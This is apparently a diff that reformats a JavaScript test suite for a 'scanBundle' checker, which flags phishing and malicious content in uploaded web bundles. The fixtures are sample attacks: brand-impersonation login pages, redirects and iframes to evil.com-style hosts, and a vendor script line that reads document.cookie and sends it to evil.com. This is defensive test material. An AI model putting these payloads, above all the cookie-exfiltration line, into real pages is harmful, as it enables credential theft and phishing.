@@ -11,7 +11,9 @@ describe("scanBundle", () => {
 
   test("allows a normal Vite SPA build", () => {
     const result = scanBundle({
-      "index.html": b64("<html><head><title>My App</title></head><body><div id='app'></div><script type='module' src='/assets/index-BkH3q2.js'></script></body></html>"),
+      "index.html": b64(
+        "<html><head><title>My App</title></head><body><div id='app'></div><script type='module' src='/assets/index-BkH3q2.js'></script></body></html>",
+      ),
       "assets/index-BkH3q2.js": b64("console.log('hello')"),
       "assets/index-D4fG8k.css": b64("body { margin: 0 }"),
     });
@@ -73,7 +75,9 @@ describe("scanBundle", () => {
 
   test("blocks PayPal brand impersonation", () => {
     const result = scanBundle({
-      "index.html": b64("<html><head><title>PayPal Account Recovery</title></head><body>Verify your account</body></html>"),
+      "index.html": b64(
+        "<html><head><title>PayPal Account Recovery</title></head><body>Verify your account</body></html>",
+      ),
     });
     expect(result.ok).toBe(false);
     expect(result.reason).toBe("content_policy");
@@ -93,7 +97,9 @@ describe("scanBundle", () => {
 
   test("blocks Ethereum addresses in HTML", () => {
     const result = scanBundle({
-      "index.html": b64("<html><body>Send ETH to 0x742d35Cc6634C0532925a3b844Bc9e7595f2bD08</body></html>"),
+      "index.html": b64(
+        "<html><body>Send ETH to 0x742d35Cc6634C0532925a3b844Bc9e7595f2bD08</body></html>",
+      ),
     });
     expect(result.ok).toBe(false);
     expect(result.reason).toBe("content_policy");
@@ -104,7 +110,9 @@ describe("scanBundle", () => {
 
   test("blocks meta refresh to external site", () => {
     const result = scanBundle({
-      "index.html": b64('<html><head><meta http-equiv="refresh" content="0;url=https://phishing.site/fake"></head></html>'),
+      "index.html": b64(
+        '<html><head><meta http-equiv="refresh" content="0;url=https://phishing.site/fake"></head></html>',
+      ),
     });
     expect(result.ok).toBe(false);
     expect(result.reason).toBe("content_policy");
@@ -113,7 +121,9 @@ describe("scanBundle", () => {
 
   test("blocks window.location redirect to external site", () => {
     const result = scanBundle({
-      "index.html": b64('<html><body><script>window.location.href="https://evil.com"</script></body></html>'),
+      "index.html": b64(
+        '<html><body><script>window.location.href="https://evil.com"</script></body></html>',
+      ),
     });
     expect(result.ok).toBe(false);
     expect(result.reason).toBe("content_policy");
@@ -124,7 +134,9 @@ describe("scanBundle", () => {
 
   test("blocks external iframe to disallowed host", () => {
     const result = scanBundle({
-      "index.html": b64('<html><body><iframe src="https://bank-login.fake.com/signin"></iframe></body></html>'),
+      "index.html": b64(
+        '<html><body><iframe src="https://bank-login.fake.com/signin"></iframe></body></html>',
+      ),
     });
     expect(result.ok).toBe(false);
     expect(result.reason).toBe("content_policy");
@@ -133,7 +145,9 @@ describe("scanBundle", () => {
 
   test("allows YouTube embed iframe", () => {
     const result = scanBundle({
-      "index.html": b64('<html><body><iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe></body></html>'),
+      "index.html": b64(
+        '<html><body><iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe></body></html>',
+      ),
       "style.css": b64("body { color: red }"),
     });
     expect(result.ok).toBe(true);
@@ -141,7 +155,9 @@ describe("scanBundle", () => {
 
   test("allows Vimeo player iframe", () => {
     const result = scanBundle({
-      "index.html": b64('<html><body><iframe src="https://player.vimeo.com/video/76979871"></iframe></body></html>'),
+      "index.html": b64(
+        '<html><body><iframe src="https://player.vimeo.com/video/76979871"></iframe></body></html>',
+      ),
       "style.css": b64("body {}"),
     });
     expect(result.ok).toBe(true);
@@ -149,7 +165,9 @@ describe("scanBundle", () => {
 
   test("allows CodePen embed", () => {
     const result = scanBundle({
-      "index.html": b64('<html><body><iframe src="https://codepen.io/team/codepen/embed/PNaGbb"></iframe></body></html>'),
+      "index.html": b64(
+        '<html><body><iframe src="https://codepen.io/team/codepen/embed/PNaGbb"></iframe></body></html>',
+      ),
       "style.css": b64("body {}"),
     });
     expect(result.ok).toBe(true);
@@ -157,7 +175,9 @@ describe("scanBundle", () => {
 
   test("allows twitter/x embed", () => {
     const result = scanBundle({
-      "index.html": b64('<html><body><iframe src="https://platform.twitter.com/embed/tweet.html?id=1234"></iframe></body></html>'),
+      "index.html": b64(
+        '<html><body><iframe src="https://platform.twitter.com/embed/tweet.html?id=1234"></iframe></body></html>',
+      ),
       "style.css": b64("body {}"),
     });
     expect(result.ok).toBe(true);
@@ -165,7 +185,9 @@ describe("scanBundle", () => {
 
   test("allows github gist embed", () => {
     const result = scanBundle({
-      "index.html": b64('<html><body><iframe src="https://gist.github.com/user/abc123.pibb"></iframe></body></html>'),
+      "index.html": b64(
+        '<html><body><iframe src="https://gist.github.com/user/abc123.pibb"></iframe></body></html>',
+      ),
       "style.css": b64("body {}"),
     });
     expect(result.ok).toBe(true);
@@ -174,7 +196,9 @@ describe("scanBundle", () => {
   test("blocks subdomain spoofing attempts", () => {
     // Attacker tries `youtube.com.evil.com` — must NOT match allowlist
     const result = scanBundle({
-      "index.html": b64('<html><body><iframe src="https://youtube.com.evil.com/signin"></iframe></body></html>'),
+      "index.html": b64(
+        '<html><body><iframe src="https://youtube.com.evil.com/signin"></iframe></body></html>',
+      ),
     });
     expect(result.ok).toBe(false);
     expect(result.detail).toContain("disallowed host");
@@ -209,7 +233,9 @@ describe("scanBundle", () => {
 
   test("allows localhost form actions", () => {
     const result = scanBundle({
-      "index.html": b64('<html><body><form action="http://localhost:3000/login"><input type="password"></form></body></html>'),
+      "index.html": b64(
+        '<html><body><form action="http://localhost:3000/login"><input type="password"></form></body></html>',
+      ),
     });
     // localhost is excluded from external form action check
     // But still has password + email signal — check that external action check is what matters
@@ -241,7 +267,9 @@ describe("scanBundle", () => {
   test("scans all HTML files, not just index.html", () => {
     const result = scanBundle({
       "index.html": b64("<html><body>Clean</body></html>"),
-      "phish/login.html": b64('<html><head><title>Apple ID Recovery</title></head><body>Verify</body></html>'),
+      "phish/login.html": b64(
+        "<html><head><title>Apple ID Recovery</title></head><body>Verify</body></html>",
+      ),
     });
     expect(result.ok).toBe(false);
     expect(result.detail).toContain("phish/login.html");
@@ -254,7 +282,7 @@ describe("scanBundle", () => {
       "index.html": b64("<html><body></body></html>"),
       "assets/vendor-abc123.js": Buffer.from(
         `const cookies = document.cookie; fetch("https://evil.com/collect", { body: cookies });` +
-        largeJs,
+          largeJs,
       ).toString("base64"),
     });
     expect(result.ok).toBe(true); // Large file is skipped
